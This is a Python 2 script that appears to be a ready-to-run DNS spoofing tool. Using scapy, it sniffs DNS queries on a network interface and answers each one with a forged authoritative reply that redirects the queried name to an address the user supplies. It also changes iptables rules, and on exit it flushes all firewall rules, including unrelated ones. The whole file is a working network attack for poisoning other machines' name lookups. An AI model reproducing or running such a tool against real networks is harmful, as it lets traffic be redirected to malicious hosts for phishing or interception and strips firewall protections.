#!/usr/bin/python

try:
        import argparse
        import sys
        import signal
        import os
        import socket
        import fcntl
        import struct
        from time import sleep
        import logging
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        from scapy.all import *
except ImportError,e:
        import sys
        sys.stdout.write("%s\n" %e)
        sys.exit(1)


print "Spoofing..."

class DnsSpoof:

        def __init__(self):
                """
                        Init functions ...
                """

                description = "Description ..."
                usage = "Usage: use --help for futher information"
                parser = argparse.ArgumentParser(description = description, usage = usage)
                parser.add_argument('-i','--interface', dest = 'interface', help = 'Specify the interface', required = True)
                parser.add_argument('-r', '--redirect', dest = 'redirect',  help = 'Redirect host ', required = True)
                self.args = parser.parse_args()

                self.dns_filter = "udp port 53"

                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ip_addr = socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915, struct.pack('256s', self.args.interface[:15]))[20:24])
                os.system("iptables -A INPUT -i %s -p udp --dport 53 -s %s -j ACCEPT"% (self.args.interface, ip_addr))
                os.system("iptables -A INPUT -i %s -p udp --dport 53 -j DROP"% (self.args.interface))



        def flush_rules(self):
                """
                        Flush all iptables rules before exiting ...
                """

                os.system("iptables --flush")



        def dns_spoof(self, pkt):
                """
                        Spoof dns packets
                """

                if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
                        spoofed_pkt = IP(dst = pkt[IP].src, src = pkt[IP].dst)/UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport)/DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa = 1, qr = 1, an = DNSRR(rrname = pkt[DNS].qd.qname,  ttl = 10, rdata = self.args.redirect))
                        send(spoofed_pkt, verbose=False)



        def exit_spoof(self, signal, frame):
                """
                        Exit spoof ...
                """

                self.flush_rules()
                sleep(1)
                print "Exiting ..."
                sys.exit(1)


        def main(self):
                """
                        Main code ...
                """

                signal.signal(signal.SIGINT, self.exit_spoof)
                while True:
                        sniff(filter = self.dns_filter, iface = self.args.interface, store = 0, prn = self.dns_spoof)

if __name__ == "__main__":
        dnsspoof = DnsSpoof()
        dnsspoof.main()
